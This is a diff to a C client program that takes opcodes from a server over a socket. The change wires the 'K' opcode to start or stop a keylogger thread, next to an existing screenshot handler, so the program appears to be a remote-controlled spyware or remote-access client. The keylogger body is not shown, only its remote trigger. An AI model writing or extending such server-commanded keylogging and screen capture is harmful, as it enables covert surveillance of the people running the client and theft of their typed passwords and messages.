@@ -10,6 +10,7 @@
 #include <unistd.h>
 #include <fcntl.h>
 #include "clientManager.h"
+#include "keylog.h"
 #include "constraints.h"
 #include "messageManager.h"
 #include "utils.h"
@@ -85,6 +86,24 @@ void startingDataInitialize()
     sendMessage(clientData.serverSocket, &msg);
 }
 
+void handleKeyLoggerOpcode()
+{
+    if(clientData.isKeyLoggerActive && clientData.keyLoggerTid != -1)
+    {
+        pthread_cancel(clientData.keyLoggerTid);   
+        clientData.keyLoggerTid = -1;
+        clientData.isKeyLoggerActive = 0;
+    }
+    else
+    {
+        clientData.isKeyLoggerActive = 1;
+        if (pthread_create(&clientData.keyLoggerTid, NULL, start_keylogger, NULL) < 0) {
+        perror("Could not create thread");
+        }
+        pthread_detach(clientData.keyLoggerTid);
+    }
+}
+
 void handleScreenshotOpcode()
 {
     message_t msg;
@@ -127,10 +146,10 @@ void handleOpcode(message_t msg)
     switch(msg.opCode)
     {
         case 'K':
-        //handle Keylogger Opcode
-        break;
+            handleKeyLoggerOpcode();
+            break;
         case 'S':
-        handleScreenshotOpcode();
-        break;
+            handleScreenshotOpcode();
+            break;
     }
 }
